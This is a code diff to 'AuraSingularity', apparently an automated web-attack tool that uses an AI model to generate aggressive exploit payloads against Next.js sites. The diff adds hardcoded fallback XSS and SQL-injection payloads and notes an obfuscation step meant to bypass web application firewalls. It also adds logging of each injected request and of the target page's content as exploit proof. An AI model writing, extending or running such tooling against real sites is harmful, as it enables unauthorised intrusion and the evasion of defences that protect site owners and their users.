@@ -189,6 +189,10 @@ class AuraSingularity:
                     # Get a high-aggression Level 3 payload
                     payload = self.brain.generate_payload(vuln_type, "Next.js/Advanced", level=3)
                     
+                    # Fallback if Gemini API fails
+                    if not payload:
+                        payload = "';alert(document.domain);//" if vuln_type == "XSS" else "' OR 1=1--"
+                        
                     # v15 Neural-Forge: Apply heavy obfuscation to bypass WAFs
                     try:
                         from aura.modules.neural_forge import NeuralForge
@@ -248,7 +252,10 @@ class AuraSingularity:
                         self.campaign_findings.append({
                             "type": bh.get("type"),
                             "confidence": "Critical",
-                            "content": f"SINGULARITY EXPLOIT: {bh.get('type')} on {url} (Ghost v6.1 Fragmented). Reasoning: {bh.get('reason')}"
+                            "content": f"SINGULARITY EXPLOIT: {bh.get('type')} on {url} (Ghost v6.1 Fragmented). Reasoning: {bh.get('reason')}",
+                            "payload": payload,
+                            "raw_request": f"POST/GET interactions with {url}\nInjected value: {payload}",
+                            "proof": content[:1000] # First 1000 chars of DOM
                         })
                         console.print(f"[bold red][🔥] SINGULARITY EXPLOIT SUCCESS: {bh.get('type')}[/bold red]")
                         break 
